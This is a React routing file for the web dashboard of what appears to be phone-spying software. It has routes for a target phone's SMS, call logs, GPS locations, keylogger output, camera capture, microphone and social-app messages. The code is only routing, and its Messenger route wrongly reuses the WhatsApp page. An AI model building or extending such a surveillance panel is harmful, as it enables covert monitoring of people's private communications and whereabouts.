import './App.css';
import Signup from "./page/Signup";
import Login from "./page/Login";
import Home from "./page/Home";
import Sidebar from "./page/Sidebar";
import Geolocation from "./page/Geolocation";
import TopBar from './page/TopBar';
import Contacts from './page/Contacts';
import MessageText from './page/MessageText';
import CallLog from './page/CallLogs';
import InstalledApps from './page/InstalledApps';
import { useState } from "react";
import { BrowserRouter as Router } from 'react-router-dom';
import { Routes, Route } from 'react-router-dom';
import KeyLogger from "./page/KeyLogger";
import CameraPhotos from "./page/CameraPhotos";
import Calls from "./page/Calls";
import Cameras from "./page/Cameras";
import WhatsApp from './page/socials/whatsapp';
import Messenger from './page/socials/whatsapp';
import Instagram from './page/socials/instagram';
import Tiktok from './page/socials/tiktok';
import Locations from './page/Locations';
import Microphone from "./page/Microphone";


function App() {
    const [phone, setPhone] = useState("");

    return (
        <Router>
            <div className="container-fluid">
                <div className="row flex-nowrap">
                    <Sidebar />
                    <div className="col py-3">
                        <TopBar setPhone={setPhone} />
                        <Routes>
                            <Route path="/" element={<Home />} />
                            <Route path="/home" element={<Home />} />
                            <Route path="/signup" element={<Signup />} />
                            <Route path="/login" element={<Login />} />
                            <Route path="/contacts" element={<Contacts phone={phone} />} />
                            <Route path="/sms" element={<MessageText phone={phone} />} />
                            <Route path="/call-logs" element={<CallLog phone={phone} />} />
                            <Route path="/installed-apps" element={<InstalledApps phone={phone} />} />
                            <Route path="/emplacement-gps" element={<Geolocation phone={phone} />} />
                            <Route path="/emplacements-gps" element={<Locations phone={phone} />} />
                            <Route path="/keylogger" element={<KeyLogger phone={phone} />} />
                            <Route path="/camera-photo" element={<CameraPhotos phone={phone} />} />
                            <Route path="/calls" element={<Calls phone={phone} />} />
                            <Route path="/capture-camera" element={<Cameras phone={phone} />} />
                            <Route path="/social">
                                <Route path="whatsapp" element={<WhatsApp phone={phone} />} />
                                <Route path="messenger" element={<Messenger phone={phone} />} />
                                <Route path="instagram" element={<Instagram phone={phone} />} />
                                <Route path="tiktok" element={<Tiktok phone={phone} />} />
                            </Route>
                            <Route path="/microphone" element={<Microphone phone={phone} />} />
                        </Routes>
                    </div>
                </div>
            </div>
        </Router>
    );
}

export default App;
